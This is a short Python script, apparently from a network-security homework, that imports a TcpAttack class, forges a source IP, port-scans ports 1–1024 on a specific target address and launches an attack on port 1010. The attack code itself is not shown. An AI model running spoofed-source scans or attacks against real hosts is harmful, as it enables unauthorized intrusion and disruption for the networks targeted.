from Goedde_hw08 import *
spoofIP = '192.168.1.1'
targetIP = '128.46.4.89'
Tcp = TcpAttack(spoofIP,targetIP)
Tcp.scanTarget(1,1024)
if (Tcp.attackTarget(1010)):
    print("Port was open to attack")